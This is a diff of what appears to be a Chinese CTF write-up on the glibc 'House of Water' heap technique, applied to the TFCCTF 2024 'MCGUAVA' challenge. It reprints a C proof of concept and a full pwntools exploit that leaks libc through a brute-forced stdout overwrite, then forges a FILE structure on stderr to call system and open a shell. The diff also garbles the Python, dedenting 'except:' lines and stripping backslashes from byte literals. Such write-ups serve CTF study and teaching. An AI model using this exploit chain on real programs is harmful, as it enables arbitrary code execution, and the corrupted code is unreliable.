@@ -79,24 +79,24 @@ int main(void) {
  void *fake_size_msb = malloc(0x3e8);
  free(fake_size_lsb);
  free(fake_size_msb);
- 
+
  void *metadata = (void *)((long)(fake_size_lsb) & ~(0xfff));
 
  void *x[7];
  for (int i = 0; i < 7; i++) {
  x[i] = malloc(0x88);
  }
- 
- 
+
+
  void *unsorted_start = malloc(0x88);
  _ = malloc(0x18); // Guard chunk
 
  void *unsorted_middle = malloc(0x88);
  _ = malloc(0x18); // Guard chunk
- 
+
  void *unsorted_end = malloc(0x88);
  _ = malloc(0x18); // Guard chunk
- 
+
  _ = malloc(0xf000); // Padding
  void *end_of_fake = malloc(0x18); // Metadata chunk
 
@@ -106,33 +106,33 @@ int main(void) {
  for (int i = 0; i < 7; i++) {
  free(x[i]);
  }
- 
- *(long*)(unsorted_start-0x18) = 0x31; 
+
+ *(long*)(unsorted_start-0x18) = 0x31;
 
  free(unsorted_start-0x10); // Create a fake FWD
- 
- *(long*)(unsorted_start-0x8) = 0x91; 
 
- *(long*)(unsorted_end-0x18) = 0x21; 
- 
+ *(long*)(unsorted_start-0x8) = 0x91;
+
+ *(long*)(unsorted_end-0x18) = 0x21;
+
  free(unsorted_end-0x10); // Create a fake BCK
- 
- *(long*)(unsorted_end-0x8) = 0x91; 
+
+ *(long*)(unsorted_end-0x8) = 0x91;
 
  free(unsorted_end);
- 
+
  free(unsorted_middle);
 
  free(unsorted_start);
 
  *(unsigned long *)unsorted_start = (unsigned long)(metadata+0x80);
- 
+
  *(unsigned long *)(unsorted_end+0x8) = (unsigned long)(metadata+0x80);
 
  // Next allocation *could* be our faked chunk!
  void *meta_chunk = malloc(0x288);
 
- assert(meta_chunk == (metadata+0x90)); 
+ assert(meta_chunk == (metadata+0x90));
 }
 
 因为在编译阶段我们使用了“-g”参数，可以使用gdb在任意行下断点 b + 行号。
@@ -334,7 +334,7 @@ def free(index):
 add(0x600) # 7
 add(0x600) # 8 fake 0x30
 add(0x600) # 9
-add(0x500) # 10 
+add(0x500) # 10
 free(7)
 free(8)
 free(9)
@@ -356,7 +356,7 @@ add(0x6e0) # 16
 add(0x600) # 7
 add(0x600) # 8 fake 0x30
 add(0x600) # 9
-add(0x500) # 10 
+add(0x500) # 10
 free(7)
 free(8)
 free(9)
@@ -441,7 +441,7 @@ free(30)
 所以我们需要用我们刚获取的 tcache 堆块来对 unsorted_end、unsorted_start 的 size 位进行恢复。
 
 add(0x330,0x18,p64(0x511)) # 39
- free(39) 
+ free(39)
  add(0x340,0x18,p64(0x511)) # 40
  free(40)
 
@@ -491,7 +491,7 @@ add(0x100,0,p16(0x2780))
 
 然后再将该地址申请出来，将地址的低 3 位改为 stdout 地址的低 3 位，爆破第 4 位，用 tcache 分配堆块到 stdout 上进而泄露出 libc 的地址，这里的爆破成功率也为 1/16。
 
-add(0x100,0,p16(0x2780)) 
+add(0x100,0,p16(0x2780))
 add(0x230,0,p64(0xfbad1800)+p64(0)*3+b'x00x00')
 p.recvuntil(b'x7f',timeout=1)
 libc_base = u64(p.recvuntil(b'x7f',timeout=1)[-6:].ljust(8,b'x00'))-0x219aa0
@@ -499,14 +499,14 @@ libc_base = u64(p.recvuntil(b'x7f',timeout=1)[-6:].ljust(8,b'x00'))-0x219aa0
 获取 libc 地址后我们可以吧刚才申请在 tcache_perthread_struct 上的堆块释放掉再重新申请回来，然后在 tcache_perthread_struct 上存储 0x250 大小 tcache 最后一个 chunk 的地方写上IO_2_1_stderr的地址，并申请 0x250 大小的堆块在IO_2_1_stderr上写上 fake file。
 
 free(86)
-add(0x100,0x8,p64(libc_base+libc.symbols['_IO_2_1_stderr_'])) 
+add(0x100,0x8,p64(libc_base+libc.symbols['_IO_2_1_stderr_']))
 
 fake_file = flat({
  0x0: b" sh;",
  0x28: libc_base + libc.symbols['system'],
  0x88: libc_base + libc.symbols['_environ']-0x10,
  0xa0: libc_base+libc.symbols['_IO_2_1_stderr_']-0x40, # _wide_data
- 0xD8: libc_base + libc.symbols['_IO_wfile_jumps'], # jumptable 
+ 0xD8: libc_base + libc.symbols['_IO_wfile_jumps'], # jumptable
 }, filler=b"x00")
 
 最后让程序通过 exit 函数退出即可执行我们的 fsop 攻击。
@@ -569,7 +569,7 @@ while True:
  add(0x600) # 7
  add(0x600) # 8 fake 0x30
  add(0x600) # 9
- add(0x500) # 10 
+ add(0x500) # 10
  free(7)
  free(8)
  free(9)
@@ -632,7 +632,7 @@ while True:
  add(0x1d0) # 38
 
  add(0x330,0x18,p64(0x511)) # 39
- free(39) 
+ free(39)
  add(0x340,0x18,p64(0x511)) # 40
  free(40)
 
@@ -657,9 +657,10 @@ while True:
  free(80)
  add(0x340,0x28,p16(0x0080)) # 81
  free(81)
- try: 
+ try:
  add(0x500) # 82
- except:
+ 
+except:
  p.close()
  continue
 
@@ -671,7 +672,8 @@ while True:
  add(0x100,0,p16(0x2780)) # 85
  try:
  add(0x230,0,p64(0xfbad1800)+p64(0)*3+b'x00x00') # 86
- except:
+ 
+except:
  p.close()
  continue
  libc_base = 0
@@ -680,7 +682,8 @@ while True:
  libc_base = u64(p.recvuntil(b'x7f',timeout=1)[-6:].ljust(8,b'x00'))-0x219aa0
  if hex(libc_base)[2] != '7' or hex(libc_base)[3] != 'f':
  raise ValueError("leak libc error")
- except:
+ 
+except:
  p.close()
  continue
 
@@ -697,12 +700,12 @@ while True:
  0x28: libc_base + libc.symbols['system'],
  0x88: libc_base + libc.symbols['_environ']-0x10,
  0xa0: libc_base+libc.symbols['_IO_2_1_stderr_']-0x40, # _wide_data
- 0xD8: libc_base + libc.symbols['_IO_wfile_jumps'], # jumptable 
- }, filler=b"x00") 
+ 0xD8: libc_base + libc.symbols['_IO_wfile_jumps'], # jumptable
+ }, filler=b"x00")
 
  # 在 _IO_2_1_stderr_ 上写上我们的 fake file
  add(0x240,0,fake_file)
- 
+
  # 退出程序，执行 fsop 攻击
  meau(3)
  p.sendline(b'cat flag.txt')
@@ -744,11 +747,6 @@ https://bbs.kanxue.com/user-home-985117.htm
 ```
 一
 House of water
-```
-
-
-
-```
 /* There is one of these for each thread, which contains the
  per-thread cache (hence "tcache_perthread_struct"). Keeping
  overall size low is mildly important. Note that COUNTS and ENTRIES
@@ -759,16 +757,11 @@ typedef struct tcache_perthread_struct
  uint16_t counts[TCACHE_MAX_BINS];
  tcache_entry *entries[TCACHE_MAX_BINS];
 } tcache_perthread_struct;
-```
-
-
-
-```
 // Ubuntu 22.04.3 LTS
 // gcc -g house_of_water.c -o test
-#include <stdio.h>
-#include <stdlib.h>
-#include <assert.h>
+    #include <stdio.h>
+    #include <stdlib.h>
+    #include <assert.h>
 
 int main(void) {
  void *_ = NULL;
@@ -781,24 +774,24 @@ int main(void) {
  void *fake_size_msb = malloc(0x3e8);
  free(fake_size_lsb);
  free(fake_size_msb);
- 
+
  void *metadata = (void *)((long)(fake_size_lsb) & ~(0xfff));
 
  void *x[7];
  for (int i = 0; i < 7; i++) {
  x[i] = malloc(0x88);
  }
- 
- 
+
+
  void *unsorted_start = malloc(0x88);
  _ = malloc(0x18); // Guard chunk
 
  void *unsorted_middle = malloc(0x88);
  _ = malloc(0x18); // Guard chunk
- 
+
  void *unsorted_end = malloc(0x88);
  _ = malloc(0x18); // Guard chunk
- 
+
  _ = malloc(0xf000); // Padding
  void *end_of_fake = malloc(0x18); // Metadata chunk
 
@@ -808,46 +801,36 @@ int main(void) {
  for (int i = 0; i < 7; i++) {
  free(x[i]);
  }
- 
- *(long*)(unsorted_start-0x18) = 0x31; 
+
+ *(long*)(unsorted_start-0x18) = 0x31;
 
  free(unsorted_start-0x10); // Create a fake FWD
- 
- *(long*)(unsorted_start-0x8) = 0x91; 
 
- *(long*)(unsorted_end-0x18) = 0x21; 
- 
+ *(long*)(unsorted_start-0x8) = 0x91;
+
+ *(long*)(unsorted_end-0x18) = 0x21;
+
  free(unsorted_end-0x10); // Create a fake BCK
- 
- *(long*)(unsorted_end-0x8) = 0x91; 
+
+ *(long*)(unsorted_end-0x8) = 0x91;
 
  free(unsorted_end);
- 
+
  free(unsorted_middle);
 
  free(unsorted_start);
 
  *(unsigned long *)unsorted_start = (unsigned long)(metadata+0x80);
- 
+
  *(unsigned long *)(unsorted_end+0x8) = (unsigned long)(metadata+0x80);
 
  // Next allocation *could* be our faked chunk!
  void *meta_chunk = malloc(0x288);
 
- assert(meta_chunk == (metadata+0x90)); 
+ assert(meta_chunk == (metadata+0x90));
 }
-```
-
-
-
-```
 二
 TFCCTF 2024MCGUAVA
-```
-
-
-
-```
 int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
 {
  int v3; // [rsp+0h] [rbp-10h] BYREF
@@ -884,11 +867,6 @@ LABEL_13:
  }
  }
 }
-```
-
-
-
-```
 unsigned __int64 guava()
 {
  int v0; // eax
@@ -924,11 +902,6 @@ unsigned __int64 guava()
  guava_gius[v0] = v4;
  return v5 - __readfsqword(0x28u);
 }
-```
-
-
-
-```
 unsigned __int64 gius()
 {
  unsigned int v1; // [rsp+4h] [rbp-Ch] BYREF
@@ -945,11 +918,6 @@ unsigned __int64 gius()
  free((void *)guava_gius[v1]);
  return v2 - __readfsqword(0x28u);
 }
-```
-
-
-
-```
 def meau(index):
  p.recvuntil('*>',timeout = 1)
  p.sendline(str(index))
@@ -967,15 +935,10 @@ def free(index):
  meau(2)
  p.recvuntil('guava no:')
  p.sendline(str(index))
-```
-
-
-
-```
 add(0x600) # 7
 add(0x600) # 8 fake 0x30
 add(0x600) # 9
-add(0x500) # 10 
+add(0x500) # 10
 free(7)
 free(8)
 free(9)
@@ -989,15 +952,10 @@ free(8)
 add(0x610) # 14
 add(0x500) # 15 unsorted_start
 add(0x6e0) # 16
-```
-
-
-
-```
 add(0x600) # 7
 add(0x600) # 8 fake 0x30
 add(0x600) # 9
-add(0x500) # 10 
+add(0x500) # 10
 free(7)
 free(8)
 free(9)
@@ -1012,11 +970,6 @@ add(0x610) # 14
 add(0x500) # 15 unsorted_start
 add(0x6e0) # 16
 free(15) # free unsorted_start
-```
-
-
-
-```
 add(0x600) # 17
 add(0x600) # 18 fake 0x20
 add(0x600) # 19
@@ -1034,27 +987,12 @@ free(18)
 add(0x610) # 24
 add(0x500) # 25 unsorted_end
 add(0x6e0) # 26
-```
-
-
-
-```
 add(0x500) # 27 unsorted_middle
 add(0x600) # 28
-```
-
-
-
-```
 add(0x3e8) # 29
 add(0x3d8) # 30
 free(29)
 free(30)
-```
-
-
-
-```
 # 获取一个 tcache 的索引，该 tcache 能够修改 fake 0x30 和 unsorted_start
  free(14)
  free(15)
@@ -1072,30 +1010,15 @@ free(30)
  add(0x340) # 37 change unsorted_end
  free(37)
  add(0x1d0) # 38
-```
-
-
-
-```
 add(0x330,0x18,p64(0x511)) # 39
- free(39) 
+ free(39)
  add(0x340,0x18,p64(0x511)) # 40
  free(40)
-```
-
-
-
-```
 for i in range(36):
  add(0x500)
 
 add(0x210) # 76
 add(0x30,0x20,p64(0x10000)+p64(0x20)) # 77
-```
-
-
-
-```
 add(0x238) #78
 add(0x248) #79
 free(78)
@@ -1110,48 +1033,23 @@ add(0x330,0x20,p16(0x0080)) # 80
 free(80)
 add(0x340,0x28,p16(0x0080)) # 81
 free(81)
-```
-
-
-
-```
 add(0x500)
 add(0x500)
-```
-
-
-
-```
 add(0x100,0,p16(0x2780))
-```
-
-
-
-```
-add(0x100,0,p16(0x2780)) 
+add(0x100,0,p16(0x2780))
 add(0x230,0,p64(0xfbad1800)+p64(0)*3+b'x00x00')
 p.recvuntil(b'x7f',timeout=1)
 libc_base = u64(p.recvuntil(b'x7f',timeout=1)[-6:].ljust(8,b'x00'))-0x219aa0
-```
-
-
-
-```
 free(86)
-add(0x100,0x8,p64(libc_base+libc.symbols['_IO_2_1_stderr_'])) 
+add(0x100,0x8,p64(libc_base+libc.symbols['_IO_2_1_stderr_']))
 
 fake_file = flat({
  0x0: b" sh;",
  0x28: libc_base + libc.symbols['system'],
  0x88: libc_base + libc.symbols['_environ']-0x10,
  0xa0: libc_base+libc.symbols['_IO_2_1_stderr_']-0x40, # _wide_data
- 0xD8: libc_base + libc.symbols['_IO_wfile_jumps'], # jumptable 
+ 0xD8: libc_base + libc.symbols['_IO_wfile_jumps'], # jumptable
 }, filler=b"x00")
-```
-
-
-
-```
 from pwn import *
 from LibcSearcher import *
 from ctypes import *
@@ -1208,7 +1106,7 @@ while True:
  add(0x600) # 7
  add(0x600) # 8 fake 0x30
  add(0x600) # 9
- add(0x500) # 10 
+ add(0x500) # 10
  free(7)
  free(8)
  free(9)
@@ -1271,7 +1169,7 @@ while True:
  add(0x1d0) # 38
 
  add(0x330,0x18,p64(0x511)) # 39
- free(39) 
+ free(39)
  add(0x340,0x18,p64(0x511)) # 40
  free(40)
 
@@ -1296,9 +1194,10 @@ while True:
  free(80)
  add(0x340,0x28,p16(0x0080)) # 81
  free(81)
- try: 
+ try:
  add(0x500) # 82
- except:
+ 
+except:
  p.close()
  continue
 
@@ -1310,7 +1209,8 @@ while True:
  add(0x100,0,p16(0x2780)) # 85
  try:
  add(0x230,0,p64(0xfbad1800)+p64(0)*3+b'x00x00') # 86
- except:
+ 
+except:
  p.close()
  continue
  libc_base = 0
@@ -1319,7 +1219,8 @@ while True:
  libc_base = u64(p.recvuntil(b'x7f',timeout=1)[-6:].ljust(8,b'x00'))-0x219aa0
  if hex(libc_base)[2] != '7' or hex(libc_base)[3] != 'f':
  raise ValueError("leak libc error")
- except:
+ 
+except:
  p.close()
  continue
 
@@ -1336,12 +1237,12 @@ while True:
  0x28: libc_base + libc.symbols['system'],
  0x88: libc_base + libc.symbols['_environ']-0x10,
  0xa0: libc_base+libc.symbols['_IO_2_1_stderr_']-0x40, # _wide_data
- 0xD8: libc_base + libc.symbols['_IO_wfile_jumps'], # jumptable 
- }, filler=b"x00") 
+ 0xD8: libc_base + libc.symbols['_IO_wfile_jumps'], # jumptable
+ }, filler=b"x00")
 
  # 在 _IO_2_1_stderr_ 上写上我们的 fake file
  add(0x240,0,fake_file)
- 
+
  # 退出程序，执行 fsop 攻击
  meau(3)
  p.sendline(b'cat flag.txt')
